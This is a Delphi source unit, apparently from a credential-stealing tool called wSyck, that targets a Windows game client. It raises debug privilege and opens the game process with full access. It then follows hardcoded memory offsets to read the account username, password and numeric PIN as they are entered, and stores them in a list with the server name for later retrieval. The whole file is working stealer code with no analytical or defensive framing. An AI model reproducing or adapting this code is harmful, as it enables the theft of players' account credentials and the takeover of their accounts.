unit wSyck.Login;

interface

uses
  Winapi.Windows, System.SysUtils, System.Classes,
  {wSyck}
  wSyck.Base,
  wSyck.Addrs,
  wSyck.Functions;

type
  TLogin = class
  private
    Valor : DWORD;
    User, Pass, Numeric : STRING;
    List : TStringList;

    function ReadAddr(v1, v2 : DWORD) : DWORD;

    function Panel : DWORD;
    function Logged : DWORD;

    function fUser    : STRING;
    function fPass    : STRING;
    function fNumeric : STRING;
    procedure AddUser;

    function SvName : STRING;
  public
    PID : DWORD;
    function Get(I : INTEGER) : STRING;
    function Count : INTEGER;
    constructor Create;
    procedure inLoop;
  end;

var
  Login : TLogin;

implementation

constructor TLogin.Create;
begin
  List  := TStringList.Create;
end;

procedure TLogin.AddUser;
var
  I     : INTEGER;
  Achou : BOOL;
  Line  : STRING;
begin
  Line := Format('%s|%s|%s|%s', [SvName, User, Pass, Numeric]);
  Achou := False;
  for I := 0 to List.Count-1 do
    if List.Strings[I].Equals(Line) then
    begin
      Achou := True;
      break;
    end;

  if not Achou then
    List.Add(Line);
end;

function TLogin.Get(I: Integer) : STRING;
begin
  try
    Result := List.Strings[I];
  except
    Result := Format('Error: %d', [I]);
  end;
end;

function TLogin.Count : INTEGER;
begin
  Result := List.Count;
end;

function TLogin.ReadAddr(v1, v2 : DWORD) : DWORD;
var
  NBR      : SIZE_T;
  Unc      : DWORD;
  hProcess : THandle;
begin
  RtlAdjustPrivilege(20, True, 0, @Unc);
  hProcess := OpenProcess(PROCESS_ALL_ACCESS, False, PID);
  ReadProcessMemory(hProcess, PTR(CONS_PTRDAT), @Valor,4, NBR);
  Inc(Valor, v1);
  if v2 <> 0 then
  begin
    ReadProcessMemory(hProcess, PTR(Valor), @Valor, 4, NBR);
    Inc(Valor, v2);
  end;
  Result := Valor;
end;

function TLogin.Panel : DWORD;
var
  NBR      : SIZE_T;
  Unc      : DWORD;
  hProcess : THandle;
  I        : INTEGER;
const
  Addrs    : ARRAY[1..5] OF DWORD = ($26E98, $C, $8, $4, $28);
begin
  RtlAdjustPrivilege(20, True, 0, @Unc);
  hProcess := OpenProcess(PROCESS_ALL_ACCESS, False, PID);
  ReadProcessMemory(hProcess, PTR(CONS_PTRDAT), @Valor, 4, NBR);
  for I := 1 to 5 do
  begin
    Inc(Valor, Addrs[I]);
    ReadProcessMemory(hProcess, PTR(Valor), @Valor, 4, NBR);
  end;
  Result := Valor;
end;

function TLogin.Logged : DWORD;
var
  NBR      : SIZE_T;
  Unc      : DWORD;
  hProcess : THandle;
begin
  RtlAdjustPrivilege(20, True, 0, @Unc);
  hProcess := OpenProcess(PROCESS_ALL_ACCESS, False, PID);
  ReadProcessMemory(hProcess, PTR($02288690), @valor, 4, NBR);
  Inc(Valor, $7C);
  ReadProcessMemory(hProcess, PTR(Valor), @Valor, 4, NBR);
  Result := Valor;
end;

function TLogin.fUser : STRING;
begin
  Result := ReadString(ReadAddr($27D28, $7C));
end;

function TLogin.fPass : STRING;
begin
  Result := Readstring(ReadAddr($27D2C, $E4C));
end;

function TLogin.fNumeric : STRING;
begin
  Result := Readstring(ReadAddr($26E66, 0));
end;

procedure TLogin.inLoop;
begin
  if Panel = 1 then
  begin
    if Logged = 0 then
    begin
      User := fUser;
      Pass := fPass;
    end
    else if Logged = 1 then
      Numeric := fNumeric;
  end
  else if (Panel = 64) and
          (Length(User) >= 4) and (Length(User) <= 12) and
          (Length(Pass) >= 4) and (Length(Pass) <= 10) and
          (Length(Numeric) >= 4) and  (Length(Numeric) <= 6) then
    AddUser;
end;

function TLogin.SvName : STRING;
begin
  Result := ReadString(CONS_SVNAME);
  if Result <> '' then
    Result := Explode(Result, '-')[0];
end;

begin
  Login := TLogin.Create;
end.
